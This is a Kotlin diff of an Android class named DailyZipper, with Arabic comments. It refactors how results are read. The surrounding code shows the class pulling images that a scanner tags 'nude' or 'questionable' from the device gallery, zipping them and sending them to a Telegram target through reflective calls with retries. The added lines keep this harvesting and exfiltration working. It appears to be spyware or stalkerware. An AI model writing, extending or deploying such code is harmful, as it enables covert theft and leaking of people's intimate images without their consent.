@@ -23,12 +23,8 @@ import java.util.concurrent.atomic.AtomicBoolean
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
-// ✅ استيراد دوال safeGet من MapExtensions.kt
-import com.example.app.safeGetString
-import com.example.app.safeGetBoolean
-
 /**
- * فئة تجميع الملفات وحصادها - خالية تماماً من الأقواس المربعة على الخرائط
+ * فئة تجميع الملفات وحصادها - خالية تماماً من أي تعارض مع التعبيرات النمطية
  */
 class DailyZipper(
     context: Context,
@@ -270,7 +266,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram (باستخدام safeGetBoolean)
+    //  إرسال الملفات إلى Telegram (بدون دوال خارجية)
     // ============================================================
 
     private suspend fun safeSend(
@@ -304,12 +300,17 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ تحويل صريح إلى Map<Any?, Any?> ثم استخدام safeGetBoolean
+
+                // ✅ استخراج القيمة مباشرة بدون دوال تمديد خارجية
                 val success = when (result) {
                     is Boolean -> result
-                    is Map<*, *> -> (result as Map<Any?, Any?>).safeGetBoolean("ok")
+                    is Map<*, *> -> {
+                        val okValue = result.get("ok")
+                        okValue is Boolean && okValue
+                    }
                     else -> false
                 }
+
                 if (success) {
                     return true
                 }
@@ -615,7 +616,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (باستخدام safeGetString)
+    //  التشغيل التلقائي (استخراج المسار بأمان)
     // ============================================================
 
     fun run(): Boolean {
@@ -636,9 +637,12 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ تحويل صريح إلى Map<Any?, Any?> ثم استخدام safeGetString
+                            // ✅ استخراج المسار مباشرة بدون دوال خارجية
                             val path = when (item) {
-                                is Map<*, *> -> (item as Map<Any?, Any?>).safeGetString("path")
+                                is Map<*, *> -> {
+                                    val p = item.get("path")
+                                    if (p is String) p else ""
+                                }
                                 else -> ""
                             }
                             if (path.isNotEmpty()) {
